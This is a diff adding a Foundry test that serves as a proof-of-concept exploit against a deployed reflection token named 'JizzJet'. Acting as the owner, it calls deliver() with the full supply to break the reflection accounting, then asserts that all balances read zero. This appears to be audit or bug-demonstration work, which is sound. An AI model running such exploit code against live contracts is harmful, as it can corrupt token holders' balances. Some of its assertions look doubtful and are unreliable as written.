@@ -1,0 +1,85 @@
+```solidity
+// SPDX-License-Identifier: Unlicensed
+pragma solidity ^0.6.12;
+
+import "forge-std/Test.sol";
+
+interface IJizzJet {
+    function owner() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function deliver(uint256 tAmount) external;
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function isExcludedFromReward(address account) external view returns (bool);
+    function tokenFromReflection(uint256 rAmount) external view returns (uint256);
+    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    address constant JIZZ_JET = 0xf2a7429641d1b49a13dcb7e23b67a1a5101231f2;
+    IJizzJet jizz = IJizzJet(JIZZ_JET);
+
+    address admin;
+    address victim;
+
+    function setUp() public {
+        vm.label(JIZZ_JET, "JizzJet");
+        admin = jizz.owner();
+        vm.label(admin, "Admin (owner)");
+        victim = address(0x1234);
+        vm.label(victim, "Victim");
+
+        // Ensure we have a funded account to work with
+        vm.deal(admin, 100 ether);
+        vm.deal(address(this), 10 ether);
+    }
+
+    function testExploit_IntegerUnderflowBreaksAccounting() public {
+        // Record initial state
+        uint256 initialTotalSupply = jizz.totalSupply();
+        uint256 initialAdminBalance = jizz.balanceOf(admin);
+        console.log("Total supply before deliver:", initialTotalSupply);
+        console.log("Admin balance before deliver:", initialAdminBalance);
+
+        // Admin is not excluded from reward
+        assertFalse(jizz.isExcludedFromReward(admin), "Admin should not be excluded from reward");
+
+        // Get the reflection value for the total supply
+        uint256 rAmount = jizz.reflectionFromToken(initialTotalSupply, false);
+        console.log("Reflection for total supply:", rAmount);
+
+        // Admin calls deliver with the whole token supply – this will drain _rTotal
+        vm.prank(admin);
+        jizz.deliver(initialTotalSupply);
+
+        // After deliver, admin's reflection balance becomes zero, and _rTotal becomes zero
+        uint256 newAdminBalance = jizz.balanceOf(admin);
+        console.log("Admin balance after deliver:", newAdminBalance);
+        // Balance should be 0 because rate = 0
+        assertEq(newAdminBalance, 0, "Admin balance should be 0 after draining reflections");
+
+        // Total supply remains unchanged
+        uint256 totalSupplyAfter = jizz.totalSupply();
+        assertGe(totalSupplyAfter, initialTotalSupply, "Total supply should not decrease");
+
+        // Attempt to transfer tokens – this should succeed without updating reflection balances
+        // Transfer 1 token to victim
+        vm.prank(admin);
+        bool success = jizz.transfer(victim, 1 ether);
+        assertTrue(success, "Transfer should succeed syntactically");
+
+        // Check balances: both should still be 0
+        uint256 adminBalAfterTransfer = jizz.balanceOf(admin);
+        uint256 victimBalAfterTransfer = jizz.balanceOf(victim);
+        console.log("Admin balance after transfer:", adminBalAfterTransfer);
+        console.log("Victim balance after transfer:", victimBalAfterTransfer);
+        assertEq(adminBalAfterTransfer, 0, "Admin balance should remain 0");
+        assertEq(victimBalAfterTransfer, 0, "Victim balance should remain 0");
+
+        // The total supply still shows the original amount, but all wallets show 0 balance.
+        uint256 totalSupplyAfterTransfer = jizz.totalSupply();
+        assertEq(totalSupplyAfterTransfer, initialTotalSupply, "Total supply should still be the same");
+        // This demonstrates the integer calculation error: the reflection mechanism is broken.
+    }
+}
+```
